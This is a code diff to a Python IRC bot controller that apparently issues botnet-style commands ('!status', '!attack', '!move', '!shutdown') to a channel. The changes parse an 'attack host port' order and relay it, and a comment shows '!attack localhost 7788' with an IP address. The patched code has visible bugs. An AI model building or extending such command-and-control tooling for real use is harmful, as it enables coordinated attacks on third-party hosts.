@@ -17,7 +17,7 @@ errorList = [ "402","403","431","432",'433',"436","437","461","465","471","473",
 
 class inputThread(threading.Thread):
     def __init__(self):
-        self.commandList = ["!status","!attack","!move","!quit","!shutdown"] 
+        self.commandList = ["status","attack","move","quit","!shutdown"] 
         threading.Thread.__init__ ( self )
         
     def run(self):        
@@ -37,7 +37,7 @@ class clientBot(object):
         self.port = port
         self.NICK = nick
         self.command = ''
-        self.comList = ["!status","!attack","!move","!quit","!shutdown"] 
+        self.comList = ["status","!attack","!move","!quit","!shutdown"] 
         
         self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -142,11 +142,13 @@ def connection():
         userCommand = ''
         try:            
             userCommand = input("Please enter a valid command:")
-            if(userCommand not in commandList):
+            testing = userCommand.split()[0]
+            print(testing)
+            if(testing not in commandList):
                 raise ValueError 
         except ValueError:
             grabInput(commandList)
-        return userCommand
+        return userCommand.split()
     #try:
     #    inThread = threading.Thread(target = grabInput,args=(comList,))
     #    
@@ -208,13 +210,20 @@ def connection():
             if(isConnected):
                 cBot.command = grabInput(cBot.comList) 
                 print("command = ")
-                print(cBot.command)
-                if(cBot.command == cBot.activationPhrase):
+                print(cBot.command[0])
+                if(cBot.command[0] == cBot.activationPhrase):
                     cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, cBot.command).encode("utf-8"))
                     cBot.command = grabInput(cBot.comList)
-                    cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, cBot.command).encode("utf-8"))
-                else:                    
-                    cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, cBot.command).encode("utf-8"))    
+                    cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, "!"+cBot.command[0]).encode("utf-8"))
+                elif(cBot.command[0] == "status") :                    
+                    cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, "!"+cBot.command[0]).encode("utf-8"))    
+                elif(cBot.command[0] == "attack"):
+                    attackHost = cBot.command[1]
+                    attackPort = cBot.command[2]
+                    #cBot.command = grabInput(cBot.comList)
+                    #:simdevs!~simdevs@136.159.160.155 PRIVMSG #simdevs :!attack localhost 7788
+                    cBot.s.send("PRIVMSG {} : {}\r\n".format(cBot.chan, "!"+cBot.command).encode("utf-8"))
+                    
     except Exception as e:
         print("Exception: ")
         print(e)
